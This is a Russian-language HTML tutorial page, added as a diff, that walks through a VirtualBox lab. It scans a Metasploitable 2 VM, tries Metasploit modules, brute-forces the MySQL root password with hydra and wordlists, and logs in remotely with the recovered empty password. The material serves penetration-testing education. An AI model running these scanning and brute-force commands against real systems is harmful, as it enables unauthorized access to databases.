@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2n.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 14. Hydra - подбираем пароль к MySQL в metasploitable-linux-2.0.0
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+
+<p>
+Начинаем атаку на удаленную машину Metasploitable 2.
+</p>
+
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале:
+</p>
+
+<p>
+nmap -sC -sV 10.0.2.3
+</p>
+
+<p>
+В выводе nmap находим такую строку (сриншот ниже):
+</p>
+
+<p>
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+</p>
+
+<p>
+Открыт 3306 порт и на нем служба MySQL.
+</p>
+
+<br>
+
+<img src="./picn/pic114.jpg" width=1400 alt="kali linux терминал команда nmap">
+
+<p>
+Еще один способ определить версию MySQL.
+</p>
+
+<p>
+Запускаем метсплоит:
+</p>
+
+<p>
+msfconsole
+</p>
+
+<p>
+msf > use auxiliary/scanner/mysql/mysql_version
+<br>
+msf auxiliary(scanner/mysql/mysql_version) > set RHOSTS 10.0.2.3
+<br>
+msf auxiliary(scanner/mysql/mysql_version) > run
+</p>
+
+<img src="./picn/pic115.jpg" width=1400 alt="kali linux терминал msfconsole run">
+
+<p>
+Вывод на скриншоте выше так же определил версию MySQL:
+</p>
+
+<p>
+10.0.2.3:3306 is running MySQL 5.0.51a-3ubuntu5
+</p>
+
+<p>
+Далее будем подбирать пароль к MySQL для пользователя root.
+</p>
+
+<p>
+Дадим команду в терминале Kali распаковать словарь их архива:
+</p>
+
+<p>
+gunzip /usr/share/wordlists/rockyou.txt.gz
+</p>
+
+<p>
+Если использовать брутфорс из метасплоит, то новая версия метасплоит плохо работает со старой версией MySQL на удаленной машине, но кто хочет может попробывать такие команды (можно так же установить старую версию Kali и метасплоит):
+</p>
+
+<p>
+msf > use auxiliary/scanner/mysql/mysql_login
+<br>
+msf auxiliary(mysql_login) > set RHOSTS 10.0.2.3
+<br>
+msf auxiliary(mysql_login) > set USER_FILE /usr/share/wordlists/rockyou.txt
+<br>
+msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+<br>
+msf auxiliary(mysql_login) > run
+</p>
+
+<p>
+После запуска run у меня вылетает ошибка, как на скриншоте ниже:
+</p>
+
+<img src="./picn/pic116.jpg" width=1400 alt="kali linux терминал msfconsole run">
+
+<p>
+Завершаем работу с метасплоит командой exit.
+</p>
+
+<p>
+Поэтому для подбора пароля к MySQL используем программу Hydra.
+</p>
+
+<p>
+Ниже две команды- эти команды аналогичны, разница в том что для подбора пароля используют разные словари.
+<p>	
+
+<p>
+hydra -l root -e n -P /usr/share/wordlists/rockyou.txt -t 32 mysql://10.0.2.3:3306 -V
+</p>
+
+<p>
+hydra -l root -P /usr/share/wordlists/fasttrack.txt -t 32 mysql://10.0.2.3:3306 -V
+</p>
+
+<p>
+Для примера возьмем первую команду и введем в терминал Kali (скриншот ниже):
+</p>
+
+<img src="./picn/pic117.jpg" width=1400 alt="kali linux терминал hydra">
+
+<p>
+Если пароль пустой (empty password), то Hydra часто выводит только найденный логин, без текста пароля, например:
+</p>
+
+<p>
+[3306][mysql] host: 10.0.2.3   login: root
+</p>
+
+<p>
+Это означает, что пароль — пустая строка ("").
+</p>
+
+<p>
+Почему Hydra так делает
+</p>
+
+<p>
+Hydra считает пустой пароль отдельным случаем и не печатает что-то вроде
+</p>
+
+<p>
+password:
+</p>
+
+<p>
+или
+</p>
+
+<p>
+password: ""
+</p>
+
+<p>
+потому что выводить нечего.
+</p>
+
+
+<p>
+В нашем выводе видим- пароль пустая строка.
+</p>
+
+<p>
+Мы узнали пароль, теперь заходим в MySQL.
+</p>
+
+<p>
+Ниже две команды заходы в MySQL, можно взять любую:
+</p>
+
+<p>
+mysql --skip-ssl -h 10.0.2.3 -u root
+</p>
+
+
+<p>
+mysql --skip-ssl -h 10.0.2.3 -u root -p
+</p>
+
+<p>
+В случае с ключем -p при запросе пароля нажать клавишу Enter и MySQL продолжит работу.
+</p>
+
+<img src="./picn/pic118.jpg" width=1400 alt="kali linux терминал mysql">
+
+<br>
+<br>
+
+<img src="./picn/pic119.jpg" width=1400 alt="kali linux терминал mysql">
+
+<p>
+Hydra — это инструмент для подбора учетных данных (логина и пароля) к различным сетевым сервисам.
+</p>
+
+<p>
+Она может работать двумя основными способами:
+</p>
+
+<p>
+1)Перебор по словарю (dictionary attack) — берет пароли из файла и проверяет их один за другим.
+</p>
+
+<p>
+Например:
+</p>
+
+<p>
+hydra -l root -P /usr/share/wordlists/fasttrack.txt mysql://10.0.2.3
+</p>
+
+<p>
+Здесь:
+</p>
+
+<p>
+-l root — логин root;
+<br>
+-P fasttrack.txt — список возможных паролей;
+<br>
+mysql://10.0.2.3 — сервер MySQL.
+</p>
+
+<p>
+2)Проверка специальных вариантов паролей с помощью -e:
+</p>
+
+<p>
+n — пустой пароль;
+<br>
+s — пароль совпадает с логином;
+<br>
+r — пароль равен логину, записанному наоборот.
+</p>
+
+<p>
+Например:
+</p>
+
+<p>
+hydra -l root -e ns mysql://10.0.2.3
+</p>
+
+<p>
+сначала попробует пустой пароль, затем пароль root.
+</p>
+
+<p>
+Что происходит внутри
+</p>
+
+<p>
+Hydra не "угадывает" пароль математически. Она:
+</p>
+
+<p>
+подключается к серверу;
+<br>
+отправляет логин и очередной пароль;
+<br>
+если сервер отвечает «неверный пароль» — пробует следующий;
+<br>
+если сервер принимает пароль — сообщает об успехе и (по умолчанию) прекращает подбор для этого логина.
+</p>
+
+<p>
+Такой метод называется брутфорс (brute force) или, если используется словарь, словарная атака (dictionary attack). Словарная атака обычно значительно быстрее полного перебора всех возможных комбинаций символов.
+</p>
+
+</body>
+</html>
